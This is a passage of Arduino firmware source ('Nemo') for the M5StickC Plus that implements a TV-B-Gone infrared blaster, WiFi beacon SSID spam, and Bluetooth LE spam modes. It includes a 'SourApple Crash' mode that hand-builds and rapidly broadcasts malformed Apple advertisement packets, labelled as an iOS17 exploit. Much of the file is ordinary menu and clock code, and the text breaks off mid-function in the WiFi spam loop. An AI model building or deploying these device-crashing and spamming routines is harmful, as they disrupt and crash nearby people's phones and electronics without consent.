// Nemo Firmware for the M5 Stack Stick C Plus
// github.com/n0xa | IG: @4x0nn
#define PLUS
#if defined(PLUS)
  #include <M5StickCPlus.h>
  #define BIG_TEXT 4 
  #define MEDIUM_TEXT 3
  #define SMALL_TEXT 2
  #define TINY_TEXT 1
#else
  #include <M5StickC.h>
  #define BIG_TEXT 2
  #define MEDIUM_TEXT 2
  #define SMALL_TEXT 1
  #define TINY_TEXT 1
#endif

#include <EEPROM.h>
#include <IRremoteESP8266.h>
#include <IRsend.h>
#include "applejuice.h"
#include "WORLD_IR_CODES.h"
#include "wifispam.h"
#include <BLEUtils.h>
#include <BLEServer.h>
bool pct_brightness = true;  /* set to false if the screen goes
                              to full brightness over level 2. 
                              Useful range is about 7-15.
                              Set to true if the screen is too
                              dim no matter what level is set.
                              Some versions of the M5Stack lib
                              have a percentage range 0-100. */

int advtime = 0; 
String formattedDate;
String dayStamp;
String timeStamp;
int cursor = 0;
int wifict = 0;
int rotation = 1;
int brightness = 100;
int ajDelay = 1000;
bool rstOverride = false; // Reset Button Override. Set to true when navigating menus.
bool sourApple = false;   // Internal flag to place AppleJuice into SourApple iOS17 Exploit Mode
bool swiftPair = false;   // Internal flag to place AppleJuice into Swift Pair random packet Mode
bool maelstrom = false;   // Internal flag to place AppleJuice into Bluetooth Maelstrom mode
#define EEPROM_SIZE 4

struct MENU {
  char name[19];
  int command;
};

/// SWITCHER ///
// Proc codes
// 0  - Clock
// 1  - Main Menu
// 2  - Settings Menu
// 3  - Clock set
// 4  - Dimmer Time adjustment
// 5  - TV B-GONE
// 6  - Battery info
// 7  - screen rotation
// 8  - AppleJuice Menu
// 9  - AppleJuice Advertisement
// 10 - Credits 
// 11 - Wifi beacon spam
// 12 - Wifi spam menu
// 13 - TV-B-Gone Region Setting
// 14 - Wifi scanning
// 15 - Wifi scan results
// 16 - Bluetooth Spam Menu
// 17 - Bluetooth Maelstrom

bool isSwitching = true;
int current_proc = 0; // Start in Clock Mode
void switcher_button_proc() {
  if (rstOverride == false) {
    if (digitalRead(M5_BUTTON_RST) == LOW) {
      isSwitching = true;
      current_proc = 1;
    }
  }
}

bool screen_dim_dimmed = false;
int screen_dim_time = 30;
int screen_dim_current = 0;

void screen_dim_proc() {
  M5.Rtc.GetBm8563Time();
  // if one of the buttons is pressed, take the current time and add screen_dim_time on to it and roll over when necessary
  if (digitalRead(M5_BUTTON_RST) == LOW || digitalRead(M5_BUTTON_HOME) == LOW) {
    if (screen_dim_dimmed) {
      screen_dim_dimmed = false;
      M5.Axp.ScreenBreath(brightness);
    }
    int newtime = M5.Rtc.Second + screen_dim_time + 2; // hacky but needs a couple extra seconds added

    if (newtime >= 60) {
      newtime = newtime - 60;
    }
    screen_dim_current = newtime;
  }
  if (screen_dim_dimmed == false) {
    if (M5.Rtc.Second == screen_dim_current || (M5.Rtc.Second + 1) == screen_dim_current || (M5.Rtc.Second + 2) == screen_dim_current) {
      M5.Axp.ScreenBreath(10);
      screen_dim_dimmed = true;
    }
  }
}

// Tap the power button from pretty much anywhere to get to the main menu
void check_axp_press() {
  if (M5.Axp.GetBtnPress()) {
    isSwitching = true;
    rstOverride = false;
    current_proc = 1;
    delay(100);
  }
}

/// MAIN MENU ///
MENU mmenu[] = {
  { "Clock", 0},
  { "TV-B-Gone", 13}, // We jump to the region menu first
  { "Bluetooth Spam", 16},
  { "WiFi Spam", 12},
  { "WiFi Scan", 14},
  { "Settings", 2},
};

void mmenu_drawmenu() {
  M5.Lcd.setTextSize(SMALL_TEXT);
  M5.Lcd.fillScreen(BLACK);
  M5.Lcd.setCursor(0, 8, 1);
  for ( int i = 0 ; i < ( sizeof(mmenu) / sizeof(MENU) ) ; i++ ) {
    M5.Lcd.print((cursor == i) ? ">" : " ");
    M5.Lcd.println(mmenu[i].name);
  }
}

void mmenu_setup() {
  M5.Lcd.setRotation(rotation);
  cursor = 0;
  rstOverride = true;
  mmenu_drawmenu();
  delay(250); // Prevent switching after menu loads up
}

void mmenu_loop() {
  if (digitalRead(M5_BUTTON_RST) == LOW) {
    cursor++;
    cursor = cursor % ( sizeof(mmenu) / sizeof(MENU) );
    mmenu_drawmenu();
    delay(250);
  }
  if (digitalRead(M5_BUTTON_HOME) == LOW) {
    rstOverride = false;
    isSwitching = true;
    current_proc = mmenu[cursor].command;
  }
}

/// SETTINGS MENU ///
MENU smenu[] = {
  { "Battery Info", 6},
  { "Brightness", 4},
  { "Set Clock", 3},
  { "Rotation", 7},
  { "About", 10},
  { "Back", 1},
};

void smenu_drawmenu() {
  M5.Lcd.setTextSize(SMALL_TEXT);
  M5.Lcd.fillScreen(BLACK);
  M5.Lcd.setCursor(0, 8, 1);
  for ( int i = 0 ; i < ( sizeof(smenu) / sizeof(MENU) ) ; i++ ) {
    M5.Lcd.print((cursor == i) ? ">" : " ");
    M5.Lcd.println(smenu[i].name);
  }
}

void smenu_setup() {
  M5.Lcd.setRotation(rotation);
  cursor = 0;
  rstOverride = true;
  smenu_drawmenu();
  delay(250); // Prevent switching after menu loads up
}

void smenu_loop() {
  if (digitalRead(M5_BUTTON_RST) == LOW) {
    cursor++;
    cursor = cursor % ( sizeof(smenu) / sizeof(MENU) );
    smenu_drawmenu();
    delay(250);
  }
  if (digitalRead(M5_BUTTON_HOME) == LOW) {
    rstOverride = false;
    isSwitching = true;
    current_proc = smenu[cursor].command;
  }
}

/// Dimmer MENU ///
MENU dmenu[] = {
  { "5 seconds", 5},
  { "10 seconds", 10},
  { "15 seconds", 15},
  { "20 seconds", 20},
  { "25 seconds", 25},
  { "30 seconds", 30},
  { "Back", screen_dim_time},
};

void dmenu_drawmenu() {
  M5.Lcd.setTextSize(SMALL_TEXT);
  M5.Lcd.fillScreen(BLACK);
  M5.Lcd.setCursor(0, 8, 1);
  for ( int i = 0 ; i < ( sizeof(dmenu) / sizeof(MENU) ) ; i++ ) {
    M5.Lcd.print((cursor == i) ? ">" : " ");
    M5.Lcd.println(dmenu[i].name);
  }
}

void dmenu_setup() {
  M5.Lcd.setRotation(rotation);
  M5.Lcd.fillScreen(BLACK);
  M5.Lcd.setCursor(0, 5, 1);
  M5.Lcd.println("SET AUTO DIM TIME");
  delay(1000);
  cursor = (screen_dim_time / 5) - 1; 
  rstOverride = true;
  dmenu_drawmenu();
  delay(250); // Prevent switching after menu loads up
}

void dmenu_loop() {
  if (digitalRead(M5_BUTTON_RST) == LOW) {
    cursor++;
    cursor = cursor % ( sizeof(dmenu) / sizeof(MENU) );
    dmenu_drawmenu();
    delay(250);
  }
  if (digitalRead(M5_BUTTON_HOME) == LOW) {
    screen_dim_time = dmenu[cursor].command;
    EEPROM.write(1, screen_dim_time);
    EEPROM.commit();
    M5.Lcd.fillScreen(BLACK);
    M5.Lcd.setCursor(0, 5, 1);
    M5.Lcd.println("SET BRIGHTNESS");
    delay(1000);
    if(pct_brightness){
      cursor = brightness / 10;
    } else {
      cursor = brightness + 5;
    }
    timeset_drawmenu(11);
    while(digitalRead(M5_BUTTON_HOME) == HIGH) {
      if (digitalRead(M5_BUTTON_RST) == LOW) {
        cursor++;
        cursor = cursor % 11 ;
        timeset_drawmenu(11);
        if(pct_brightness){
          M5.Axp.ScreenBreath(10 * cursor);
        } else {
          M5.Axp.ScreenBreath(5 + cursor);
        }
        delay(250);
       }
    }
    if(pct_brightness){
      brightness = cursor * 10;
    } else {
      brightness = cursor + 5;
    }
   M5.Axp.ScreenBreath(brightness);
    EEPROM.write(2, brightness);
    EEPROM.commit();
    rstOverride = false;
    isSwitching = true;
    current_proc = 2;
  }
}

/// Rotation MENU ///
MENU rmenu[] = {
  { "Right", 1},
  { "Left", 3},
  { "Back", rotation},
};

void rmenu_drawmenu() {
  M5.Lcd.setTextSize(SMALL_TEXT);
  M5.Lcd.fillScreen(BLACK);
  M5.Lcd.setCursor(0, 8, 1);
  for ( int i = 0 ; i < ( sizeof(rmenu) / sizeof(MENU) ) ; i++ ) {
    M5.Lcd.print((cursor == i) ? ">" : " ");
    M5.Lcd.println(rmenu[i].name);
  }
}

void rmenu_setup() {
  M5.Lcd.setRotation(rotation);
  cursor = 0;
  rstOverride = true;
  rmenu_drawmenu();
  delay(250); // Prevent switching after menu loads up
}

void rmenu_loop() {
  if (digitalRead(M5_BUTTON_RST) == LOW) {
    cursor++;
    cursor = cursor % ( sizeof(rmenu) / sizeof(MENU) );
    rmenu_drawmenu();
    delay(250);
  }
  if (digitalRead(M5_BUTTON_HOME) == LOW) {
    rstOverride = false;
    isSwitching = true;
    rotation = rmenu[cursor].command;
    EEPROM.write(0, rotation);
    EEPROM.commit();
    current_proc = 2;
  }
}

/// BATTERY INFO ///
void battery_drawmenu(int battery, int b, int c) {
  M5.Lcd.setTextSize(SMALL_TEXT);
  M5.Lcd.fillScreen(BLACK);
  M5.Lcd.setCursor(0, 8, 1);
  M5.Lcd.print("Battery: ");
  M5.Lcd.print(battery);
  M5.Lcd.println("%");
  M5.Lcd.print("DeltaB: ");
  M5.Lcd.println(b);
  M5.Lcd.print("DeltaC: ");
  M5.Lcd.println(c);
  M5.Lcd.println("");
  M5.Lcd.println("Press any button to exit");
}
void battery_setup() {
  M5.Lcd.setRotation(rotation);
  rstOverride = false;
  float c = M5.Axp.GetVapsData() * 1.4 / 1000;
  float b = M5.Axp.GetVbatData() * 1.1 / 1000;
  int battery = ((b - 3.0) / 1.2) * 100;
  battery_drawmenu(battery, b, c);
  delay(250); // Prevent switching after menu loads up
}

void battery_loop() {
  delay(300);
  float c = M5.Axp.GetVapsData() * 1.4 / 1000;
  float b = M5.Axp.GetVbatData() * 1.1 / 1000;
  int battery = ((b - 3.0) / 1.2) * 100;
  battery_drawmenu(battery, b, c);
  if (digitalRead(M5_BUTTON_HOME) == LOW) {
    rstOverride = false;
    isSwitching = true;
    current_proc = 1;
  }
}

/// TV-B-GONE ///
void tvbgone_setup() {
  M5.Lcd.fillScreen(BLACK);
  M5.Lcd.setTextSize(BIG_TEXT);
  M5.Lcd.setCursor(5, 1);
  M5.Lcd.println("TV-B-Gone");
  M5.Lcd.setTextSize(SMALL_TEXT);
  irsend.begin();
  // Hack: Set IRLED high to turn it off after setup. Otherwise it stays on (active low)
  digitalWrite(IRLED, HIGH);

  delay_ten_us(5000);
  if(region == NA) {
    M5.Lcd.print("Region:\nAmericas / Asia\n");
  }
  else {
    M5.Lcd.println("Region: EMEA");
  }
  M5.Lcd.println("Front Key: Go/Pause");
  M5.Lcd.println("Side Key: Exit");
  delay(1000);
}

void tvbgone_loop()
{
  if (digitalRead(TRIGGER) == BUTTON_PRESSED)
  {
    delay_ten_us(40000);
    while (digitalRead(TRIGGER) == BUTTON_PRESSED) {
      delay_ten_us(500);
      yield();
    }
    sendAllCodes();
  }
  yield();
}

/// TVBG-Region MENU ///
MENU tvbgmenu[] = {
  { "Americas / Asia", 0},
  { "EU/MidEast/Africa", 1},
};

void tvbgmenu_drawmenu() {
  M5.Lcd.setTextSize(SMALL_TEXT);
  M5.Lcd.fillScreen(BLACK);
  M5.Lcd.setCursor(0, 8, 1);
  for ( int i = 0 ; i < ( sizeof(tvbgmenu) / sizeof(MENU) ) ; i++ ) {
    M5.Lcd.print((cursor == i) ? ">" : " ");
    M5.Lcd.println(tvbgmenu[i].name);
  }
}

void tvbgmenu_setup() {  
  M5.Lcd.fillScreen(BLACK);
  M5.Lcd.setTextSize(BIG_TEXT);
  M5.Lcd.setCursor(5, 1);
  M5.Lcd.println("TV-B-Gone");
  M5.Lcd.setTextSize(MEDIUM_TEXT);
  M5.Lcd.println("Region");
  cursor = region % 2;
  rstOverride = true;
  delay(1000); 
  tvbgmenu_drawmenu();
}

void tvbgmenu_loop() {
  if (digitalRead(M5_BUTTON_RST) == LOW) {
    cursor++;
    cursor = cursor % ( sizeof(tvbgmenu) / sizeof(MENU) );
    tvbgmenu_drawmenu();
    delay(250);
  }
  if (digitalRead(M5_BUTTON_HOME) == LOW) {
    region = tvbgmenu[cursor].command;
    EEPROM.write(3, region);
    EEPROM.commit();
    rstOverride = false;
    isSwitching = true;
    current_proc = 5;
  }
}

void sendAllCodes()
{
  bool endingEarly = false; //will be set to true if the user presses the button during code-sending
  if (region == NA) {
    num_codes = num_NAcodes;
  } else {
    num_codes = num_EUcodes;
  }
  for (i = 0 ; i < num_codes; i++)
  {
    if (region == NA) {
      powerCode = NApowerCodes[i];
    }
    else {
      powerCode = EUpowerCodes[i];
    }
    const uint8_t freq = powerCode->timer_val;
    const uint8_t numpairs = powerCode->numpairs;
    M5.Lcd.fillScreen(BLACK);
    M5.Lcd.setTextSize(BIG_TEXT);
    M5.Lcd.setCursor(5, 1);
    M5.Lcd.println("TV-B-Gone");
    M5.Lcd.setTextSize(SMALL_TEXT);
    M5.Lcd.println("Front Key: Go/Pause");
    const uint8_t bitcompression = powerCode->bitcompression;
    code_ptr = 0;
    for (uint8_t k = 0; k < numpairs; k++) {
      uint16_t ti;
      ti = (read_bits(bitcompression)) * 2;
      #if defined(PLUS)
        offtime = powerCode->times[ti];  // read word 1 - ontime
        ontime = powerCode->times[ti + 1]; // read word 2 - offtime
      #else
        ontime = powerCode->times[ti];  // read word 1 - ontime
        offtime = powerCode->times[ti + 1]; // read word 2 - offtime      
      #endif
      M5.Lcd.setTextSize(TINY_TEXT);
      M5.Lcd.printf("rti = %d Pair = %d, %d\n", ti >> 1, ontime, offtime);
      rawData[k * 2] = offtime * 10;
      rawData[(k * 2) + 1] = ontime * 10;
      yield();
    }
    irsend.sendRaw(rawData, (numpairs * 2) , freq);
    #if defined(PLUS)
      // Hack: Set IRLED high to turn it off after each burst. Otherwise it stays on (active low)
      digitalWrite(IRLED, HIGH);
    #endif
    yield();
    bitsleft_r = 0;
    delay_ten_us(20500);
    if (M5.Axp.GetBtnPress()){
      // duplicate code here, sadly, since this is a blocking loop
      endingEarly = true;
      current_proc = 1;
      isSwitching = true;
      rstOverride = false; 
      break;     
    }
    if (digitalRead(TRIGGER) == BUTTON_PRESSED){
      while (digitalRead(TRIGGER) == BUTTON_PRESSED) {
        yield();
      }
      endingEarly = true;
      quickflashLEDx(4);
      break; 
    }
  } 
  if (endingEarly == false)
  {
    delay_ten_us(MAX_WAIT_TIME); // wait 655.350ms
    delay_ten_us(MAX_WAIT_TIME); // wait 655.350ms
    quickflashLEDx(8);
  }
  M5.Lcd.fillScreen(BLACK);
  M5.Lcd.setTextSize(BIG_TEXT);
  M5.Lcd.setCursor(5, 1);
  M5.Lcd.println("TV-B-Gone");
  M5.Lcd.setTextSize(SMALL_TEXT);
  M5.Lcd.println("Front Key: Go/Pause");
  M5.Lcd.println("Side Key: Exit");
}

/// CLOCK ///
void clock_setup() {
  M5.Lcd.setRotation(rotation);
  M5.Lcd.fillScreen(BLACK);
  M5.Lcd.setTextSize(MEDIUM_TEXT);
}

void clock_loop() {
  M5.Rtc.GetBm8563Time();
  M5.Lcd.setCursor(40, 40, 2);
  M5.Lcd.printf("%02d:%02d:%02d\n", M5.Rtc.Hour, M5.Rtc.Minute, M5.Rtc.Second);
  delay(250);
}

/// TIMESET ///
void timeset_drawmenu(int nums) {
  M5.Lcd.setRotation(rotation);
  M5.Lcd.setTextSize(SMALL_TEXT);
  M5.Lcd.fillScreen(BLACK);
  M5.Lcd.setCursor(0, 5, 1);
  // scrolling menu
  if (cursor > 5) {
    for ( int i = 0 + (cursor - 5) ; i < nums ; i++ ) {
      M5.Lcd.print((cursor == i) ? ">" : " ");
      M5.Lcd.println(i);
    }
  } else {
    for (
      int i = 0 ; i < nums ; i++ ) {
      M5.Lcd.print((cursor == i) ? ">" : " ");
      M5.Lcd.println(i);
    }
  }
}

/// TIME SETTING ///
void timeset_setup() {
  rstOverride = true;
  M5.Lcd.fillScreen(BLACK);
  M5.Lcd.setCursor(0, 5, 1);
  M5.Lcd.println("SET HOUR");
  delay(2000);
}

void timeset_loop() {
  M5.Rtc.GetBm8563Time();
  cursor = M5.Rtc.Hour;
  timeset_drawmenu(24);
  while(digitalRead(M5_BUTTON_HOME) == HIGH) {
    if (digitalRead(M5_BUTTON_RST) == LOW) {
      cursor++;
      cursor = cursor % 24 ;
      timeset_drawmenu(24);
      delay(100);
    }
  }
  int hour = cursor;
  M5.Lcd.fillScreen(BLACK);
  M5.Lcd.setCursor(0, 5, 1);
  M5.Lcd.println("SET MINUTE");
  delay(2000);
  cursor = M5.Rtc.Minute;
  timeset_drawmenu(60);
  while(digitalRead(M5_BUTTON_HOME) == HIGH) {
    if (digitalRead(M5_BUTTON_RST) == LOW) {
      cursor++;
      cursor = cursor % 60 ;
      timeset_drawmenu(60);
      delay(100);
    }
  }
  int minute = cursor;
  M5.Lcd.fillScreen(BLACK);
  M5.Lcd.setCursor(0, 5, 1);
  RTC_TimeTypeDef TimeStruct;
  TimeStruct.Hours   = hour;
  TimeStruct.Minutes = minute;
  TimeStruct.Seconds = 0;
  M5.Rtc.SetTime(&TimeStruct);
  M5.Lcd.printf("Setting Time:\n%02d:%02d:00",hour,minute);
  delay(2000);
  rstOverride = false;
  isSwitching = true;
  current_proc = 0;
}

/// Bluetooth Spamming ///
/// BTSPAM MENU ///
MENU btmenu[] = {
  { "AppleJuice", 0},
  { "Swift Pair", 1},
  { "SourApple Crash", 2},
  { "BT Maelstrom", 3},
  { "Back", 4}
};

void btmenu_drawmenu() {
  M5.Lcd.setTextSize(SMALL_TEXT);
  M5.Lcd.fillScreen(BLACK);
  M5.Lcd.setCursor(0, 8, 1);
  for ( int i = 0 ; i < ( sizeof(btmenu) / sizeof(MENU) ) ; i++ ) {
    M5.Lcd.print((cursor == i) ? ">" : " ");
    M5.Lcd.println(btmenu[i].name);
  }
}

void btmenu_setup() {
  M5.Lcd.setRotation(rotation);
  cursor = 0;
  sourApple = false;
  swiftPair = false;
  maelstrom = false;
  rstOverride = true;
  btmenu_drawmenu();
  delay(250); // Prevent switching after menu loads up
}

void btmenu_loop() {
  if (digitalRead(M5_BUTTON_RST) == LOW) {
    cursor++;
    cursor = cursor % ( sizeof(btmenu) / sizeof(MENU) );
    btmenu_drawmenu();
    delay(250);
  }
  if (digitalRead(M5_BUTTON_HOME) == LOW) {
    int option = btmenu[cursor].command;
    M5.Lcd.setRotation(rotation);
    M5.Lcd.fillScreen(BLACK);
    M5.Lcd.setTextSize(MEDIUM_TEXT);
    M5.Lcd.setCursor(5, 1);
    M5.Lcd.println("BT Spam");
    M5.Lcd.setTextSize(SMALL_TEXT);
    M5.Lcd.print("Advertising:\n");

    switch(option) {
      case 0:
        M5.Lcd.fillScreen(BLACK);
        rstOverride = false;
        isSwitching = true;
        current_proc = 8;
        break;
      case 1:
        swiftPair = true;
        current_proc = 9; // jump straight to appleJuice Advertisement
        rstOverride = false;
        isSwitching = true;
        M5.Lcd.print("Swift Pair Random");
        M5.Lcd.print("\n\nSide Key: Exit");
        break;
      case 2:
        sourApple = true;
        current_proc = 9; // jump straight to appleJuice Advertisement
        rstOverride = false;
        isSwitching = true;
        M5.Lcd.print("SourApple Crash");
        M5.Lcd.print("\n\nSide Key: Exit");
        break;
      case 3:
        rstOverride = false;
        isSwitching = true;
        current_proc = 17; // Maelstrom
        M5.Lcd.print("Bluetooth Maelstrom\n");
        M5.Lcd.print(" Combined BT Spam");
        M5.Lcd.print("\n\nSide Key: Exit");
        break;
      case 4:
        M5.Lcd.fillScreen(BLACK);
        rstOverride = false;
        isSwitching = true;
        current_proc = 1;
        break;
    }
  }
}

MENU ajmenu[] = {
  { "AirPods", 1},
  { "Transfer Number", 27},
  { "AirPods Pro", 2},
  { "AirPods Max", 3},
  { "AirPods G2", 4},
  { "AirPods G3", 5},
  { "AirPods Pro G2", 6},
  { "PowerBeats", 7},
  { "PowerBeats Pro", 8},
  { "Beats Solo Pro", 9},
  { "Beats Studio Buds", 10},
  { "Beats Flex", 11},
  { "Beats X", 12},
  { "Beats Solo 3", 13},
  { "Beats Studio 3", 14},
  { "Beats Studio Pro", 15},
  { "Beats Fit Pro", 16},
  { "Beats Studio Buds+", 17},
  { "AppleTV Setup", 18},
  { "AppleTV Pair", 19},
  { "AppleTV New User", 20},
  { "AppleTV AppleID", 21},
  { "AppleTV Audio", 22},
  { "AppleTV HomeKit", 23},
  { "AppleTV Keyboard", 24},
  { "AppleTV Network", 25},
  { "TV Color Balance", 26},
  { "Setup New Phone", 28},
  { "Back", 29},
};

void aj_drawmenu() {
  M5.Lcd.setRotation(rotation);
  M5.Lcd.setTextSize(SMALL_TEXT);
  M5.Lcd.fillScreen(BLACK);
  M5.Lcd.setCursor(0, 5, 1);
  // scrolling menu
  if (cursor > 5) {
    for ( int i = 0 + (cursor - 5) ; i < ( sizeof(ajmenu) / sizeof(MENU) ) ; i++ ) {
      M5.Lcd.print((cursor == i) ? ">" : " ");
      M5.Lcd.println(ajmenu[i].name);
    }
  } else {
    for (
      int i = 0 ; i < ( sizeof(ajmenu) / sizeof(MENU) ) ; i++ ) {
      M5.Lcd.print((cursor == i) ? ">" : " ");
      M5.Lcd.println(ajmenu[i].name);
    }
  }
}

void aj_setup(){
  M5.Lcd.fillScreen(BLACK);
  M5.Lcd.setTextSize(MEDIUM_TEXT);
  M5.Lcd.setCursor(5, 1);
  M5.Lcd.println("AppleJuice");
  delay(1000);  
  cursor = 0;
  sourApple = false;
  swiftPair = false;
  maelstrom = false;
  rstOverride = true;
  aj_drawmenu();
}

void aj_loop(){
  if (!maelstrom){
    if (digitalRead(M5_BUTTON_RST) == LOW) {
      cursor++;
      cursor = cursor % ( sizeof(ajmenu) / sizeof(MENU) );
      aj_drawmenu();
      delay(100);
    }
  }
  if (digitalRead(M5_BUTTON_HOME) == LOW || maelstrom) {
    deviceType = ajmenu[cursor].command;
    if (maelstrom) {
      deviceType = random(1, 28);
    }
    switch(deviceType) {
      case 1:
        data = Airpods;
        break;
      case 2:
        data = AirpodsPro;
        break;
      case 3:
        data = AirpodsMax;
        break;
      case 4:
        data = AirpodsGen2;
        break;
      case 5:
        data = AirpodsGen3;
        break;
      case 6:
        data = AirpodsProGen2;
        break;
      case 7:
        data = PowerBeats;
        break;
      case 8:
        data = PowerBeatsPro;
        break;
      case 9:
        data = BeatsSoloPro;
        break;
      case 10:
        data = BeatsStudioBuds;
        break;
      case 11:
        data = BeatsFlex;
        break;
      case 12:
        data = BeatsX;
        break;
      case 13:
        data = BeatsSolo3;
        break;
      case 14:
        data = BeatsStudio3;
        break;
      case 15:
        data = BeatsStudioPro;
        break;
      case 16:
        data = BeatsFitPro;
        break;
      case 17:
        data = BeatsStudioBudsPlus;
        break;
      case 18:
        data = AppleTVSetup;
        break;
      case 19:
        data = AppleTVPair;
        break;
      case 20:
        data = AppleTVNewUser;
        break;
      case 21:
        data = AppleTVAppleIDSetup;
        break;
      case 22:
        data = AppleTVWirelessAudioSync;
        break;
      case 23:
        data = AppleTVHomekitSetup;
        break;
      case 24:
        data = AppleTVKeyboard;
        break;
      case 25:
        data = AppleTVConnectingToNetwork;
        break;
      case 26:
        data = TVColorBalance;
        break;
      case 27:
        data = TransferNumber;
        break;
      case 28:
        data = SetupNewPhone;
        break;
      case 29:
        rstOverride = false;
        isSwitching = true;
        current_proc = 1;
        break;
    }
    if (current_proc == 8 && isSwitching == false){
      M5.Lcd.setRotation(rotation);
      M5.Lcd.fillScreen(BLACK);
      M5.Lcd.setTextSize(MEDIUM_TEXT);
      M5.Lcd.setCursor(5, 1);
      M5.Lcd.println("AppleJuice");
      M5.Lcd.setTextSize(SMALL_TEXT);
      M5.Lcd.print("Advertising:\n");
      M5.Lcd.print(ajmenu[cursor].name);
      M5.Lcd.print("\n\nSide Key: Exit");
      isSwitching = true;
      current_proc = 9; // Jump over to the AppleJuice BLE beacon loop
    }
  }
}

void aj_adv_setup(){
  rstOverride = false;  
}

void aj_adv(){
  // run the advertising loop
  // Isolating this to its own process lets us take advantage 
  // of the background stuff easier (menu button, dimmer, etc)
  rstOverride = true;
  if (sourApple || swiftPair || maelstrom){
    delay(20);   // 20msec delay instead of ajDelay for SourApple attack
    advtime = 0; // bypass ajDelay counter
  }
  if (millis() > advtime + ajDelay){
    advtime = millis();
    pAdvertising->stop(); // This is placed here mostly for timing.
                          // It allows the BLE beacon to run through the loop.
    BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();
    if (sourApple){
      Serial.print("SourApple Advertisement: ");
      // Some code borrowed from RapierXbox/ESP32-Sour-Apple
      // Original credits for algorithm ECTO-1A & WillyJL
      uint8_t packet[17];
      uint8_t size = 17;
      uint8_t i = 0;
      packet[i++] = size - 1;    // Packet Length
      packet[i++] = 0xFF;        // Packet Type (Manufacturer Specific)
      packet[i++] = 0x4C;        // Packet Company ID (Apple, Inc.)
      packet[i++] = 0x00;        // ...
      packet[i++] = 0x0F;  // Type
      packet[i++] = 0x05;                        // Length
      packet[i++] = 0xC1;                        // Action Flags
      const uint8_t types[] = { 0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0 };
      packet[i++] = types[rand() % sizeof(types)];  // Action Type
      esp_fill_random(&packet[i], 3); // Authentication Tag
      i += 3;
      packet[i++] = 0x00;  // ???
      packet[i++] = 0x00;  // ???
      packet[i++] =  0x10;  // Type ???
      esp_fill_random(&packet[i], 3);
      oAdvertisementData.addData(std::string((char *)packet, 17));
      for (int i = 0; i < sizeof packet; i ++) {
        Serial.printf("%02x", packet[i]);
      }
      Serial.println("");

    } else if (swiftPair) {
      const char* display_name = generateRandomName();
      Serial.printf("SwiftPair Advertisement: '%s' - ", display_name);
      uint8_t display_name_len = strlen(display_name);
      uint8_t size = 7 + display_name_len;
      uint8_t* packet = (uint8_t*)malloc(size);
      uint8_t i = 0;
      packet[i++] = size - 1; // Size
      packet[i++] = 0xFF; // AD Type (Manufacturer Specific)
      packet[i++] = 0x06; // Company ID (Microsoft)
      packet[i++] = 0x00; // ...
      packet[i++] = 0x03; // Microsoft Beacon ID
      packet[i++] = 0x00; // Microsoft Beacon Sub Scenario
      packet[i++] = 0x80; // Reserved RSSI Byte
      for (int j = 0; j < display_name_len; j++) {
        packet[i + j] = display_name[j];
      }
      for (int i = 0; i < size; i ++) {
        Serial.printf("%02x", packet[i]);
      }
      Serial.println("");

      i += display_name_len;  
      oAdvertisementData.addData(std::string((char *)packet, size));
    } else {
      Serial.printf("AppleJuice Advertisement: ", deviceType);
      if (deviceType >= 18){
        oAdvertisementData.addData(std::string((char*)data, sizeof(AppleTVPair)));
      } else {
        oAdvertisementData.addData(std::string((char*)data, sizeof(Airpods)));
      }
      for (int i = 0; i < sizeof(Airpods); i ++) {
        Serial.printf("%02x", data[i]);
      }      
      Serial.println("");
    }
    
    pAdvertising->setAdvertisementData(oAdvertisementData);
    pAdvertising->start();
    digitalWrite(M5_LED, LOW); //LED ON on Stick C Plus
    delay(10);
    digitalWrite(M5_LED, HIGH); //LED OFF on Stick C Plus
  }
  if (digitalRead(M5_BUTTON_RST) == LOW) {
    if (sourApple || swiftPair){
      current_proc = 16;
      btmenu_drawmenu();
    } else {
      current_proc = 8;      
      aj_drawmenu();
    }
    sourApple = false;
    swiftPair = false;
    maelstrom = false;
    pAdvertising->stop(); // Bug that keeps advertising in the background. Oops.
    delay(250);
  }
}

/// CREDITS ///
void credits_setup(){
  M5.Lcd.setRotation(rotation);
  M5.Lcd.fillScreen(WHITE);  
  M5.Lcd.qrcode("https://github.com/n0xa/m5stick-nemo", 145, 40, 100, 5);
  M5.Lcd.setTextColor(BLACK, WHITE);
  M5.Lcd.setTextSize(MEDIUM_TEXT);
  M5.Lcd.setCursor(0, 25);
  M5.Lcd.print(" M5-NEMO\n");
  M5.Lcd.setTextSize(SMALL_TEXT);
  M5.Lcd.println(" For M5Stack");
  M5.Lcd.println(" StickC-Plus");
  M5.Lcd.println("By Noah Axon");
  M5.Lcd.setCursor(155, 5);
  M5.Lcd.println("GitHub");
  M5.Lcd.setCursor(155, 25);
  M5.Lcd.println("Source:");
  M5.Lcd.setTextColor(GREEN, BLACK);
}

/// WiFiSPAM ///
void wifispam_setup() {
  // create empty SSID
  for (int i = 0; i < 32; i++)
    emptySSID[i] = ' ';
  // for random generator
  randomSeed(1);

  // set packetSize
  packetSize = sizeof(beaconPacket);
  if (wpa2) {
    beaconPacket[34] = 0x31;
  } else {
    beaconPacket[34] = 0x21;
    packetSize -= 26;
  }

  // generate random mac address
  randomMac();
  
  //change WiFi mode
  WiFi.mode(WIFI_MODE_STA);

  // set channel
  esp_wifi_set_channel(channels[0], WIFI_SECOND_CHAN_NONE);

  M5.Lcd.fillScreen(BLACK);
  M5.Lcd.setTextSize(BIG_TEXT);
  M5.Lcd.setCursor(5, 1);
  M5.Lcd.println("WiFi Spam");
  delay(1000);
  M5.Lcd.setTextSize(TINY_TEXT);
  M5.Lcd.fillScreen(BLACK);
  M5.Lcd.setCursor(0, 0);
  M5.Lcd.print("WiFi Spam");
    int ct = 0;
    const char *str;
    switch(spamtype) {
    case 1:
      for(str = funnyssids; *str; ++str) ct += *str == '\n';
      M5.Lcd.printf(" - %d SSIDs:\n", ct);
      M5.Lcd.print(funnyssids);
      break;
    case 2:
      for(str = rickrollssids; *str; ++str) ct += *str == '\n';
      M5.Lcd.printf(" - %d SSIDs:\n", ct);
      M5.Lcd.print(rickrollssids);
      break;
    case 3:
      // placed here for consistency. no-op since display handled in loop. 
      break;
  }
  M5.Lcd.setTextSize(SMALL_TEXT);
  current_proc = 11;
}

void wifispam_loop() {
  int i = 0;
  int len = 0;
  digitalWrite(M5_LED, LOW); //LED ON on Stick C Plus
  delay(1);
  digitalWrite(M5_LED, HIGH); //LED OFF on Stick C Plus
  currentTime = millis();
  if (currentTime - attackTime > 100) {
    switch(spamtype) {
      case 1:
        len = sizeof(funnyssids);
        while(i < len){
          i++;
        }
